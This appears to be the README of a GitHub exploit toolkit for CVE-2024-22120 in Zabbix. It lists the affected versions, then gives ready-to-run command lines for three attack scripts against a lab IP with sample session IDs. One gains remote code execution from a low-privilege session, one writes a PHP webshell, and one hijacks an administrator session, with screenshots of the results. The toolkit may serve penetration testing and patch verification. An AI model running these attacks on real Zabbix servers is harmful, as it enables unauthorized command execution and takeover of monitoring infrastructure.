# CVE-2024-22120 ToolKit

# Affected Version/s

```
6.0.0 - 6.0.27
6.4.0 - 6.4.12
7.0.0alpha1
```

# Credit

https://x.com/mf0cuz

> https://support.zabbix.com/browse/ZBX-24505

> https://packetstormsecurity.com/files/137454/Zabbix-3.0.3-Remote-Command-Execution.html

# Premise

- a low-privilege user

- Have permission to execute scripts

  ![](https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520113821013.png)

# Usage

## CVE-2024-22120-RCE

Capture packets to obtain sessionid and hostid:

![](https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520113103613.png)

```
python -m pip install requests pwntools

python CVE-2024-22120-RCE.py --ip 192.168.198.136 --sid f026d1c7a3c36537cfe78fed35c7456a --hostid 10084
```

![](https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520112956658.png)

## CVE-2024-22120-Webshell(Unable to use in most cases)

if you already have a session ID of Administrator privileged user, try:

```shell
python CVE-2024-22120-Webshell.py --ip 192.168.198.136 --aid fe647173d7769d55a43f161a68b256e0 --hostid 10084 --file shell.php
```

else:

```shell
python CVE-2024-22120-Webshell.py --ip 192.168.198.136 --sid f026d1c7a3c36537cfe78fed35c7456a --hostid 10084 --shell shell.php
```

But almost most of them cannot be written to the webshell through echo, because the execution user is zabbix:

![](https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520160457471.png)

## CVE-2024-22120-LoginAsAdmin

```shell
python CVE-2024-22120-LoginAsAdmin.py --ip 192.168.198.136 --sid decf4ef56988027d62ca1db2a00d8346 --hostid 10084
```

![](https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520175955624.png)

test:

![](https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520180010132.png)

replace then refresh:

![](https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520180055161.png)

login as admin!!!

![](https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240520180339314.png)
